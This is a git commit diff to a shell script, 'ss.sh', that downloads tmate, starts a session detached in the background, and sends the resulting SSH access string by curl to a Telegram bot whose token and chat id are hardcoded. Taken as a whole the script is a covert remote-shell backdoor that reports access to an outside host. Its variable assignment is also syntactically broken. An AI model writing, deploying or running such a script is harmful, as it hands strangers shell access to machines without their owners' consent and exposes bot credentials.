0863a74b453092f6b0d7a4c7e540835ce4208c15
vry30 <77574366+vry30@users.noreply.github.com>
2022-04-15 19:02:04 +0700

    Update ss.sh

--- ss.sh
+++ ss.sh
@@ -3,5 +3,5 @@ wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-s
 tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
 rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
 ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-output = "$(./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")"
+output = $(./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
 curl -s "https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text=$output"
